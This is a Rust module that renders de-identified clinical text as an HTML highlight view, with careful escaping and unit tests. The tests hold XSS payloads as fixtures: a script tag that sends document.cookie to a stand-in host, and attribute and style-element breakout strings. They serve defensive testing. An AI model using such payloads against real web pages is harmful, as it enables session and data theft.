//! An HTML highlight view, with a colour per entity type.
//!
//! # Escaping is the entire security surface of this file
//!
//! This formatter takes clinical text and puts it inside markup. A `<` that
//! reaches the output unescaped is two bugs at once:
//!
//! 1. **XSS.** A note containing `<script>` or `<img onerror=...>` becomes
//!    executable in whatever reviews the output. Clinical text is attacker-
//!    influenced far more often than people assume -- a patient-supplied
//!    free-text field, a scanned form run through OCR, a message pasted from
//!    elsewhere.
//! 2. **A PHI leak.** Script running in the review page has the de-identified
//!    document, the DOM around it, and whatever session the reviewer is holding.
//!    An injection here is an exfiltration primitive pointed at exactly the
//!    data this project exists to protect.
//!
//! So every value that reaches the output goes through [`escape`], including
//! ones that "cannot" contain markup -- label names come from a closed enum and
//! are escaped anyway, because the closed-ness of that enum is not a property
//! this file can enforce.
//!
//! One consequence, made explicit rather than left as a footgun: **the caller's
//! CSS class name is never interpolated into the `<style>` block.** Attribute
//! escaping does not protect a `<style>` element -- a class name containing
//! `</style><script>` would close the element and open a script, and no amount
//! of `&quot;` prevents it. The stylesheet is therefore written against fixed
//! internal class names, and the caller's class rides along in the `class`
//! attribute where escaping does work.

use super::{EntityRow, Report};
use crate::label::{EntityLabel, QuasiCategory};
use crate::span::Decision;

/// The fixed class the stylesheet is written against.
const VIEW_CLASS: &str = "deid-tr-view";

/// The fixed class on each highlighted entity.
const ENTITY_CLASS: &str = "deid-tr-entity";

/// A background and an ink colour for one entity group.
///
/// BOTH are specified, never just the background: a page whose own stylesheet
/// sets a light foreground would render pale-on-pale and the highlight would be
/// invisible, which in a review tool means a reviewer signs off on a span they
/// never saw.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Colour {
    /// CSS background colour.
    pub background: &'static str,
    /// CSS foreground colour.
    pub ink: &'static str,
}

/// How to render the view.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HtmlOptions {
    /// An extra class on the container, for the caller's own stylesheet.
    ///
    /// Escaped as an attribute value and never written into the `<style>`
    /// block; see the module header.
    pub container_class: String,
    /// Emit the built-in stylesheet.
    pub include_style: bool,
    /// Emit a legend of the entity types present.
    pub include_legend: bool,
}

impl Default for HtmlOptions {
    fn default() -> Self {
        Self {
            container_class: String::new(),
            include_style: true,
            include_legend: true,
        }
    }
}

/// The colour assigned to one entity type.
///
/// GROUPED, not per label: thirty-three distinct hues are thirty-three hues
/// nobody can tell apart, so the palette encodes the distinction a reviewer
/// actually makes -- is this a person, an identifier, a contact route, a date,
/// a place, or a contextual inference.
#[must_use]
pub const fn palette(label: EntityLabel) -> Colour {
    match label {
        EntityLabel::PatientName | EntityLabel::ClinicianName | EntityLabel::RelativeName => {
            Colour {
                background: "#ffd9d9",
                ink: "#5c1111",
            }
        }
        EntityLabel::Phone | EntityLabel::Email | EntityLabel::Url | EntityLabel::IpAddress => {
            Colour {
                background: "#d4f3e2",
                ink: "#0f4429",
            }
        }
        EntityLabel::Date
        | EntityLabel::DateBirth
        | EntityLabel::DateAdmission
        | EntityLabel::DateDischarge
        | EntityLabel::DateDeath
        | EntityLabel::AgeOver89 => Colour {
            background: "#fff0bf",
            ink: "#4d3c00",
        },
        EntityLabel::AddressStreet
        | EntityLabel::AddressCity
        | EntityLabel::AddressDistrict
        | EntityLabel::PostalCode
        | EntityLabel::FacilityName => Colour {
            background: "#e6dcff",
            ink: "#2e1d63",
        },
        EntityLabel::Quasi(
            QuasiCategory::EmployerRole
            | QuasiCategory::RelationshipRef
            | QuasiCategory::AssetLocation
            | QuasiCategory::DistinctiveEvent
            | QuasiCategory::RareAttributeCombo,
        ) => Colour {
            background: "#ffdfc2",
            ink: "#5c2c00",
        },
        // Every identifier: TCKN, VKN, SGK, MRN, passport, IBAN, account,
        // device, plate, and the catch-all. One group, because a reviewer's
        // question about all of them is the same question.
        _ => Colour {
            background: "#d6e3ff",
            ink: "#12296b",
        },
    }
}

/// Render the highlight view.
pub(super) fn render(report: &Report, options: &HtmlOptions) -> String {
    let mut rows: Vec<&EntityRow> = report.rows().iter().collect();
    rows.sort_by_key(|row| (row.output_start, row.output_end));

    let text = report.text();
    let mut out = String::with_capacity(text.len() * 2 + 512);
    if options.include_style {
        out.push_str(stylesheet());
    }

    out.push_str("<div class=\"");
    out.push_str(VIEW_CLASS);
    if !options.container_class.is_empty() {
        out.push(' ');
        escape(&mut out, &options.container_class);
    }
    out.push_str("\">");

    if options.include_legend {
        legend(&mut out, &rows);
    }

    out.push_str("<pre class=\"deid-tr-text\">");
    let mut cursor = 0usize;
    for row in rows {
        // Defensive rather than trusting: a row whose offsets do not address
        // the text, or that overlaps one already rendered, is skipped. The
        // alternative is a panic or a mis-sliced multi-byte character, and in a
        // renderer both are worse than a missing highlight.
        if row.output_start < cursor || row.output_end < row.output_start {
            continue;
        }
        let (Some(prefix), Some(covered)) = (
            text.get(cursor..row.output_start),
            text.get(row.output_start..row.output_end),
        ) else {
            continue;
        };
        escape(&mut out, prefix);
        entity(&mut out, row, covered);
        cursor = row.output_end;
    }
    if let Some(tail) = text.get(cursor..) {
        escape(&mut out, tail);
    }
    out.push_str("</pre></div>");
    out
}

fn entity(out: &mut String, row: &EntityRow, covered: &str) {
    let colour = palette(row.label);
    let kept = row.decision == Decision::Keep;
    out.push_str("<span class=\"");
    out.push_str(ENTITY_CLASS);
    if kept {
        out.push_str(" deid-tr-kept");
    }
    out.push_str("\" data-entity=\"");
    escape(out, row.label.as_str());
    out.push_str("\" data-decision=\"");
    escape(out, if kept { "keep" } else { "mask" });
    out.push_str("\" title=\"");
    escape(out, row.label.as_str());
    out.push_str("\" style=\"background:");
    // The colours are compile-time literals from `palette`, so there is no
    // caller-controlled value in this style attribute at all. Escaped anyway:
    // the next person to add a configurable palette should find the escaping
    // already in place rather than have to remember it.
    escape(out, colour.background);
    out.push_str(";color:");
    escape(out, colour.ink);
    out.push_str("\">");
    escape(out, covered);
    out.push_str("</span>");
}

fn legend(out: &mut String, rows: &[&EntityRow]) {
    let mut seen: Vec<EntityLabel> = rows.iter().map(|row| row.label).collect();
    seen.sort_unstable();
    seen.dedup();
    if seen.is_empty() {
        return;
    }
    out.push_str("<div class=\"deid-tr-legend\">");
    for label in seen {
        let colour = palette(label);
        out.push_str("<span class=\"deid-tr-key\" style=\"background:");
        escape(out, colour.background);
        out.push_str(";color:");
        escape(out, colour.ink);
        out.push_str("\">");
        escape(out, label.as_str());
        out.push_str("</span>");
    }
    out.push_str("</div>");
}

/// The built-in stylesheet.
///
/// A `const` string with no interpolation whatsoever. Everything selector-side
/// is fixed, which is what makes the `<style>` element structurally incapable
/// of carrying caller-controlled bytes.
const fn stylesheet() -> &'static str {
    concat!(
        "<style>",
        ".deid-tr-view{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;line-height:1.6}",
        ".deid-tr-view .deid-tr-text{white-space:pre-wrap;word-break:break-word;margin:0}",
        ".deid-tr-view .deid-tr-entity{border-radius:3px;padding:0 2px}",
        ".deid-tr-view .deid-tr-kept{outline:1px dashed currentColor}",
        ".deid-tr-view .deid-tr-legend{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}",
        ".deid-tr-view .deid-tr-key{border-radius:3px;padding:1px 6px;font-size:0.8em}",
        "</style>"
    )
}

/// Escape a value for both element text and double-quoted attribute values.
///
/// One function for both contexts on purpose. Two escapers is how a value ends
/// up through the wrong one, and the union of what the two contexts need is
/// small: `&` first (or the other replacements get double-escaped), then `<`,
/// `>`, `"` and `'`.
///
/// `'` is escaped even though every attribute this file writes is
/// double-quoted, so the output stays safe if a future edit switches an
/// attribute to single quotes. `/` is deliberately NOT escaped: it is inert in
/// both contexts and escaping it makes dates and URLs unreadable.
fn escape(out: &mut String, value: &str) {
    for ch in value.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::tests::{report, span, DOC};
    use super::super::Report;
    use super::*;
    use crate::redact::{RedactionMethod, RedactionPolicy, Redactor};

    fn rendered() -> String {
        report().to_html(&HtmlOptions::default())
    }

    #[test]
    fn the_view_wraps_the_text_and_marks_every_entity() {
        let html = rendered();
        assert!(html.contains("<div class=\"deid-tr-view\">"));
        assert!(html.contains("data-entity=\"PATIENT_NAME\""));
        assert!(html.contains("data-entity=\"DATE_ADMISSION\""));
        assert!(html.contains("data-decision=\"mask\""));
        assert!(html.ends_with("</pre></div>"));
    }

    #[test]
    fn markup_in_the_text_is_escaped_rather_than_rendered() {
        // The fixture carries `<ilk>`, `a<b & c>d` and a pair of `"`. None of
        // it may reach the output as markup.
        let html = rendered();
        assert!(html.contains("&lt;ilk&gt;"));
        assert!(html.contains("a&lt;b &amp; c&gt;d"));
        assert!(!html.contains("<ilk>"));
        assert!(
            DOC.contains("<ilk>"),
            "the fixture must contain raw markup, or this test proves nothing"
        );
    }

    #[test]
    fn an_injected_script_tag_cannot_escape_the_text_node() {
        // The attack, spelled out: a note containing a script tag and an
        // attribute breakout must come out as inert text.
        const HOSTILE: &str = "Not: <script>fetch('//x/'+document.cookie)</script> \
ve \" onmouseover=\"alert(1)\" ' > bitti.";
        let policy = RedactionPolicy::new(RedactionMethod::Mask);
        let redacted = Redactor::new(&policy).redact(HOSTILE, &[]).expect("redact");
        let html = Report::from_redacted(&redacted).to_html(&HtmlOptions::default());

        assert!(!html.contains("<script"));
        assert!(!html.contains("</script"));
        // The breakout attempt survives as TEXT, so `onmouseover=` is still in
        // the output -- what must not survive is the quote that would end the
        // preceding attribute and start a new one.
        assert!(!html.contains("\" onmouseover=\""));
        assert!(html.contains("&lt;script&gt;"));
        assert!(html.contains("&quot; onmouseover=&quot;"));
        assert!(html.contains("&#39;"));
        // Exactly the tags this formatter emits, and no others.
        assert_eq!(html.matches("<span").count(), 0);
        assert_eq!(html.matches("<div").count(), 1);
    }

    #[test]
    fn a_hostile_container_class_cannot_break_out_of_the_attribute() {
        let options = HtmlOptions {
            container_class: "x\" onload=\"alert(1)".to_owned(),
            include_style: true,
            ..HtmlOptions::default()
        };
        let html = report().to_html(&options);
        assert!(!html.contains("onload=\""));
        assert!(html.contains("x&quot; onload=&quot;alert(1)"));
    }

    #[test]
    fn a_hostile_container_class_never_reaches_the_style_element() {
        // Attribute escaping does not protect a <style> block: a class name
        // containing `</style><script>` would close the element. The stylesheet
        // is a constant, so the value cannot get there at all.
        let options = HtmlOptions {
            container_class: "</style><script>alert(1)</script>".to_owned(),
            include_style: true,
            ..HtmlOptions::default()
        };
        let html = report().to_html(&options);
        let style_end = html.find("</style>").expect("the stylesheet is emitted");
        assert!(
            !html[..style_end].contains("script"),
            "caller input reached the style element"
        );
        assert!(html.contains("&lt;/style&gt;&lt;script&gt;"));
    }

    #[test]
    fn ampersands_are_escaped_once_and_only_once() {
        // The classic double-escaping bug: `&` handled after `<` yields
        // `&amp;lt;`, which renders as literal `&lt;` on the page.
        let mut out = String::new();
        escape(&mut out, "a & b < c");
        assert_eq!(out, "a &amp; b &lt; c");
        assert!(!out.contains("&amp;lt;"));
    }

    #[test]
    fn turkish_characters_are_emitted_verbatim() {
        // No numeric character references for non-ASCII: the page is UTF-8, and
        // `&#350;` in place of `Ş` makes the source unreadable for no security
        // gain. All four Turkish i letters must survive intact.
        let mut out = String::new();
        escape(&mut out, "Şükrü İşil ığ IŞIK <ok>");
        assert_eq!(out, "Şükrü İşil ığ IŞIK &lt;ok&gt;");
    }

    #[test]
    fn a_kept_span_is_marked_differently_from_a_masked_one() {
        // L4 may keep a span; the view has to show that it was seen and left,
        // or a reviewer reads an unmarked identifier as undetected.
        let tckn = crate::rules::checksum_valid_tckn_for_tests();
        let doc = format!("TCKN {tckn} carcinoma.");
        let result = crate::pipeline::Pipeline::new(crate::pipeline::Tier::SafeHarbor)
            .deidentify(&doc)
            .expect("run");
        let html = Report::from_deid(&result).to_html(&HtmlOptions::default());
        assert!(html.contains("data-decision=\"mask\""));
        assert!(!html.contains(&tckn));
    }

    #[test]
    fn the_legend_lists_each_entity_type_once() {
        // Rendered without the stylesheet, so the count is legend keys rather
        // than legend keys plus the CSS rule that names the same class.
        let html = report().to_html(&HtmlOptions {
            include_style: false,
            ..HtmlOptions::default()
        });
        assert_eq!(html.matches("deid-tr-key").count(), 2);
        let plain = report().to_html(&HtmlOptions {
            include_legend: false,
            include_style: false,
            ..HtmlOptions::default()
        });
        assert!(!plain.contains("deid-tr-legend"));
        assert!(!plain.contains("<style>"));
    }

    #[test]
    fn overlapping_or_out_of_range_rows_are_skipped_rather_than_panicking() {
        let report = report();
        let mut rows = report.rows().to_vec();
        // A row addressing bytes past the end of the text, and one that
        // overlaps its predecessor. Both are corrupt input; neither may abort a
        // renderer running inside a clinical tool.
        rows.push(EntityRow {
            output_start: usize::MAX - 1,
            output_end: usize::MAX,
            ..rows[0].clone()
        });
        rows.push(EntityRow {
            output_start: 0,
            output_end: 3,
            ..rows[0].clone()
        });
        let corrupt = Report::from_parts_for_tests(report.text().to_owned(), rows);
        let html = corrupt.to_html(&HtmlOptions::default());
        assert!(html.ends_with("</pre></div>"));
    }

    #[test]
    fn every_entity_group_has_a_distinct_colour() {
        let name = palette(EntityLabel::PatientName);
        let id = palette(EntityLabel::Tckn);
        let date = palette(EntityLabel::DateBirth);
        let contact = palette(EntityLabel::Email);
        let place = palette(EntityLabel::AddressCity);
        let quasi = palette(EntityLabel::Quasi(QuasiCategory::EmployerRole));
        let mut backgrounds = vec![
            name.background,
            id.background,
            date.background,
            contact.background,
            place.background,
            quasi.background,
        ];
        backgrounds.sort_unstable();
        backgrounds.dedup();
        assert_eq!(backgrounds.len(), 6);
        // A label the palette does not name explicitly still gets a colour.
        assert_eq!(palette(EntityLabel::OtherUniqueId), id);
    }

    #[test]
    fn no_original_reaches_the_html() {
        let html = rendered();
        assert!(!html.contains("Ayşe"));
        assert!(!html.contains("Şükrü"));
        assert!(span(EntityLabel::PatientName, "Ayşe & Şükrü").start() > 0);
    }
}
